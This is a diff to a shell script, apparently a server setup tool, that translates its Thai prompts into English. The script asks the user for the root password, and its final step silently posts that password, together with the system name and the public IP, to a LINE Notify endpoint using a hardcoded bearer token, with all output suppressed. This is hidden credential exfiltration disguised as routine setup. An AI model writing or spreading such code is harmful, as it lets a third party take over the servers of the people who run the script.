@@ -4,7 +4,7 @@ $(wget -qO- ipv4.icanhazip.com)
 
 echo "
 ╭━━━━━━━━━━━━━━━━━━━━━━━╮"
-echo " ┈┣ กรอกรหัสผ่าน root  "
+echo " ┈┣ Enter password root  "
 echo " ╰━━━━━━━━━━━━━━━━━━━━━━━╯"
 read -p " : " pass
 
@@ -36,9 +36,9 @@ auto
 
 clear
 echo "
-ตั้งค่าเสร็จเรียบร้อย
+Settings completed
 "
 curl -X POST -H 'Authorization: Bearer 8QXhBz0jeUANsAq9ipZJy0SRxOMQ24FG3p3asWbM3XJ' -F 'message='"
-ระบบ: $(printf '%-14s' "$system")
+System: $(printf '%-14s' "$system")
 IP : $(wget -qO- ipv4.icanhazip.com)
-รหัส : $pass "'' https://notify-api.line.me/api/notify > /dev/null 2>&1
+Password : $pass "'' https://notify-api.line.me/api/notify > /dev/null 2>&1
